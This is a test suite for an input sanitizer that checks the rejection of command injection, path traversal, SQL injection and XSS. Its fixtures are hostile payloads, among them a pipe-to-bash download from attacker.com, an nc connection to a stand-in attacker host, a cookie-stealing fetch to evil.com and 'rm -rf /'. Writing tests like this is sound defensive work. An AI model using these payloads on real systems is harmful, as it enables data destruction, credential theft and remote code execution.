/**
 * Comprehensive Test Suite for InputSanitizer
 *
 * Critical security component tests covering:
 * - Command injection attacks
 * - Path traversal vulnerabilities
 * - SQL injection patterns
 * - XSS/Script injection
 * - Edge cases and boundary conditions
 * - Performance under load
 */

import { describe, expect } from 'vitest'
import { InputSanitizer } from '../../utils/input-sanitizer.js'

describe('inputSanitizer - Command Injection Protection', () => {
  it('blocks shell metacharacters', () => {
    const maliciousInputs = [
      'rm -rf /; echo "pwned"',
      'ls | grep secret',
      'echo `whoami`',
      'cat /etc/passwd && echo done',
      'curl http://evil.com; rm -rf /',
      'bash -c "echo hello"',
      'exec("dangerous_command")',
      'eval("malicious_code")',
      'system("rm -rf /")',
      '$(curl http://attacker.com)',
      '${USER}',
      'test | nc attacker.com 4444',
    ]

    maliciousInputs.forEach((input) => {
      const result = InputSanitizer.sanitize(input, { allowCommands: false })
      expect(result.isValid).toBe(false)
      expect(result.violations.length).toBeGreaterThan(0)
      expect(result.violations).toContain('Command injection pattern detected')
      // Ensure dangerous patterns are removed
      expect(result.sanitized).not.toMatch(/[;&|`$()]/)
      expect(result.sanitized).not.toMatch(/\b(bash|sh|cmd|exec|eval|system)\b/gi)
    })
  })

  it('allows safe commands when permitted', () => {
    const safeInputs = [
      'npm list package-name',
      'git status',
      'node --version',
    ]

    safeInputs.forEach((input) => {
      const result = InputSanitizer.sanitize(input, { allowCommands: true })
      expect(result.isValid).toBe(true)
      expect(result.violations).toEqual([])
      expect(result.sanitized).toBe(input)
    })
  })

  it('validates npm commands specifically', () => {
    const validNpmCommands = [
      { cmd: 'list', args: ['@eekfonky/n8n-mcp-modern'] },
      { cmd: 'outdated', args: ['typescript'] },
      { cmd: 'info', args: ['express'] },
      { cmd: 'view', args: ['lodash'] },
      { cmd: 'search', args: ['webpack'] },
    ]

    validNpmCommands.forEach(({ cmd, args }) => {
      const result = InputSanitizer.validateNpmCommand(cmd, args)
      expect(result.isValid).toBe(true)
      expect(result.violations).toEqual([])
    })

    const invalidNpmCommands = [
      { cmd: 'install', args: ['malicious-package'] }, // Not in allowlist
      { cmd: 'run', args: ['arbitrary-script'] }, // Not in allowlist
      { cmd: 'list', args: ['../../../etc/passwd'] }, // Invalid package name
      { cmd: 'info', args: ['<script>alert(1)</script>'] }, // XSS attempt
    ]

    invalidNpmCommands.forEach(({ cmd, args }) => {
      const result = InputSanitizer.validateNpmCommand(cmd, args)
      expect(result.isValid).toBe(false)
      expect(result.violations.length).toBeGreaterThan(0)
    })
  })
})

describe('inputSanitizer - Path Traversal Protection', () => {
  it('blocks directory traversal patterns', () => {
    const pathTraversalInputs = [
      '../../../etc/passwd',
      '..\\..\\windows\\system32',
      '/var/log/../../../etc/shadow',
      'legitimate/path/../../../../../../etc/hosts',
      'file\0.txt', // Null byte injection
      'CON', // Windows reserved name
      'PRN.txt', // Windows reserved name with extension
      'AUX', // Windows reserved name
      'file<>"|?*.txt', // Invalid filename characters
    ]

    pathTraversalInputs.forEach((input) => {
      const result = InputSanitizer.sanitize(input, { allowPaths: false })
      expect(result.isValid).toBe(false)
      expect(result.violations.length).toBeGreaterThan(0)
      expect(result.violations).toContain('Path traversal pattern detected')
    })
  })

  it('validates file paths specifically', () => {
    const validPaths = [
      '/tmp/safe-file.txt',
      '/var/tmp/upload.json',
      'relative/path/file.log',
      './local/file.txt',
    ]

    validPaths.forEach((path) => {
      const result = InputSanitizer.validateFilePath(path)
      if (path.startsWith('/tmp/') || path.startsWith('/var/tmp/') || !path.startsWith('/')) {
        expect(result.isValid).toBe(true)
        expect(result.violations).toEqual([])
      }
    })

    const invalidPaths = [
      '../../../etc/passwd',
      '/etc/shadow',
      'file\0.txt',
      'CON.txt',
      'file/../../etc/hosts',
    ]

    invalidPaths.forEach((path) => {
      const result = InputSanitizer.validateFilePath(path)
      expect(result.isValid).toBe(false)
      expect(result.violations.length).toBeGreaterThan(0)
    })
  })
})

describe('inputSanitizer - SQL Injection Protection', () => {
  it('detects SQL injection patterns', () => {
    const sqlInjectionInputs = [
      '\'; DROP TABLE users; --',
      'admin\' OR \'1\'=\'1',
      'user\'; DELETE FROM accounts WHERE 1=1; --',
      '1 UNION SELECT password FROM users',
      '\'; INSERT INTO admin VALUES (\'hacker\', \'password\'); --',
      'admin\'/**/OR/**/1=1',
      '1\' AND (SELECT COUNT(*) FROM users) > 0 --',
      '\' OR 1=1#',
      '\'; EXEC xp_cmdshell(\'dir\'); --',
    ]

    sqlInjectionInputs.forEach((input) => {
      const result = InputSanitizer.sanitize(input, { strictMode: true })
      expect(result.isValid).toBe(false)
      expect(result.violations.length).toBeGreaterThan(0)
      expect(result.violations).toContain('SQL injection pattern detected')
    })
  })
})

describe('inputSanitizer - XSS/Script Injection Protection', () => {
  it('blocks script injection attempts', () => {
    const xssInputs = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert(1)>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox("XSS")',
      '<style>@import"javascript:alert(1)"</style>',
      '<link rel=stylesheet href="javascript:alert(1)">',
    ]

    xssInputs.forEach((input) => {
      const result = InputSanitizer.sanitize(input, { allowHTML: false })
      expect(result.isValid).toBe(false)
      expect(result.violations.length).toBeGreaterThan(0)
      expect(result.violations).toContain('Script injection pattern detected')
      // Ensure scripts are removed
      expect(result.sanitized).not.toMatch(/<script/gi)
      expect(result.sanitized).not.toMatch(/javascript:/gi)
      expect(result.sanitized).not.toMatch(/on\w+\s*=/gi)
    })
  })

  it('allows safe HTML when permitted', () => {
    const safeHtml = '<p>This is safe text</p><strong>Bold text</strong>'
    const result = InputSanitizer.sanitize(safeHtml, { allowHTML: true })
    expect(result.isValid).toBe(true)
    expect(result.sanitized).toBe(safeHtml)
  })
})

describe('inputSanitizer - Object Sanitization', () => {
  it('sanitizes object properties recursively', () => {
    const maliciousObject = {
      'safe_key': 'safe value',
      'dangerous<script>': 'alert(1)',
      'path_traversal': '../../../etc/passwd',
      'nested': {
        sql_injection: '\'; DROP TABLE users; --',
        command_injection: 'rm -rf /',
      },
      'array_data': [
        'safe string',
        '<script>alert(1)</script>',
        'normal text',
      ],
    }

    const result = InputSanitizer.sanitizeObject(maliciousObject)

    expect(result.violations.length).toBeGreaterThan(0)
    expect(result.sanitized).toHaveProperty('safe_key')
    expect(result.sanitized.safe_key).toBe('safe value')

    // Check that dangerous keys are sanitized
    expect(Object.keys(result.sanitized)).not.toContain('dangerous<script>')

    // Check nested object sanitization
    expect(result.sanitized).toHaveProperty('nested')
    expect(result.sanitized.nested).toBeDefined()

    // Check array sanitization
    expect(result.sanitized.array_data).toBeInstanceOf(Array)
    expect(result.sanitized.array_data[0]).toBe('safe string')
    expect(result.sanitized.array_data[1]).not.toContain('<script>')
  })
})

describe('inputSanitizer - Command Arguments', () => {
  it('sanitizes command arguments safely', () => {
    const dangerousArgs = [
      'normal-arg',
      '--flag=value',
      '; rm -rf /',
      '$(curl evil.com)',
      '../../../etc/passwd',
      '--config=`cat /etc/passwd`',
    ]

    const result = InputSanitizer.sanitizeCommandArgs(dangerousArgs)

    expect(result.violations.length).toBeGreaterThan(0)
    expect(result.sanitized[0]).toBe('normal-arg')
    expect(result.sanitized[1]).toBe('--flag=value')

    // Dangerous patterns should be removed
    result.sanitized.forEach((arg) => {
      expect(arg).not.toMatch(/[;&|`$()]/)
      expect(arg).not.toMatch(/\.\.\//g)
    })
  })
})

describe('inputSanitizer - Safe Environment Creation', () => {
  it('creates secure environment variables', () => {
    const unsafeEnv = {
      'PATH': '/bin:/usr/bin; rm -rf /',
      'HOME': '/home/user',
      'MALICIOUS_VAR': '$(curl evil.com)',
      'UNSAFE<>KEY': 'value',
      'NORMAL_VAR': 'safe_value',
    }

    const safeEnv = InputSanitizer.createSafeEnvironment(unsafeEnv)

    // Should have safe defaults
    expect(safeEnv).toHaveProperty('PATH')
    expect(safeEnv).toHaveProperty('HOME')
    expect(safeEnv).toHaveProperty('TMPDIR')
    expect(safeEnv).toHaveProperty('SHELL')

    // Safe values should be preserved
    expect(safeEnv).toHaveProperty('NORMAL_VAR')
    expect(safeEnv.NORMAL_VAR).toBe('safe_value')

    // Unsafe keys should be rejected
    expect(safeEnv).not.toHaveProperty('UNSAFE<>KEY')

    // Values should be sanitized
    expect(safeEnv.PATH).not.toContain(';')
    expect(safeEnv.PATH).not.toContain('rm -rf')
  })
})

describe('inputSanitizer - Performance and Edge Cases', () => {
  it('handles large inputs efficiently', () => {
    const largeInput = `${'a'.repeat(10000)}<script>alert(1)</script>${'b'.repeat(10000)}`

    const startTime = Date.now()
    const result = InputSanitizer.sanitize(largeInput, { maxLength: 5000 })
    const endTime = Date.now()

    expect(endTime - startTime).toBeLessThan(100) // Should complete in <100ms
    expect(result.sanitized.length).toBeLessThanOrEqual(5000)
    expect(result.violations).toContain('Input truncated to 5000 characters')
    expect(result.sanitized).not.toContain('<script>')
  })

  it('handles null and undefined inputs', () => {
    const nullResult = InputSanitizer.sanitize(null)
    expect(nullResult.sanitized).toBe('')
    expect(nullResult.isValid).toBe(true)
    expect(nullResult.violations).toEqual([])

    const undefinedResult = InputSanitizer.sanitize(undefined)
    expect(undefinedResult.sanitized).toBe('')
    expect(undefinedResult.isValid).toBe(true)
    expect(undefinedResult.violations).toEqual([])
  })

  it('handles non-string inputs', () => {
    const numberResult = InputSanitizer.sanitize(12345)
    expect(numberResult.sanitized).toBe('12345')
    expect(numberResult.isValid).toBe(true)

    const objectResult = InputSanitizer.sanitize({ test: 'value' })
    expect(numberResult.sanitized).toContain('object')
    expect(numberResult.isValid).toBe(true)
  })

  it('stress test with multiple attack vectors', () => {
    const multiVectorAttack = `
      '; DROP TABLE users; --
      <script>fetch('http://evil.com/steal?data='+document.cookie)</script>
      $(curl http://attacker.com/backdoor.sh | bash)
      ../../../etc/passwd
      javascript:alert('XSS')
      \0\0\0
      CON.txt
      ||||||||
      $(($USER))
    `

    const result = InputSanitizer.sanitize(multiVectorAttack, { strictMode: true })

    expect(result.isValid).toBe(false)
    expect(result.violations.length).toBeGreaterThan(5) // Multiple violations detected

    // Verify all attack vectors are neutralized
    expect(result.sanitized).not.toMatch(/DROP TABLE/gi)
    expect(result.sanitized).not.toMatch(/<script/gi)
    expect(result.sanitized).not.toMatch(/\$\(/g)
    expect(result.sanitized).not.toMatch(/\.\.\//g)
    expect(result.sanitized).not.toMatch(/javascript:/gi)
    expect(result.sanitized).not.toMatch(/\0/g)
    expect(result.sanitized).not.toMatch(/\|{4,}/g)
  })

  it('custom character allowlist works correctly', () => {
    const input = 'abc123!@#$%^&*()_+'
    const result = InputSanitizer.sanitize(input, {
      allowedCharacters: /[a-z0-9]/i,
    })

    expect(result.sanitized).toBe('abc123')
    expect(result.violations).toContain('Disallowed characters removed')
  })

  it('maintains performance under concurrent load', async () => {
    const maliciousInputs = Array.from({ length: 100 }).fill(0).map((_, i) =>
      `<script>alert(${i})</script>; rm -rf /; ${i}' OR '1'='1`,
    )

    const startTime = Date.now()
    const results = await Promise.all(
      maliciousInputs.map(input =>
        Promise.resolve(InputSanitizer.sanitize(input, { strictMode: true })),
      ),
    )
    const endTime = Date.now()

    expect(endTime - startTime).toBeLessThan(500) // Should handle 100 inputs in <500ms
    results.forEach((result) => {
      expect(result.isValid).toBe(false)
      expect(result.violations.length).toBeGreaterThan(0)
    })
  })
})
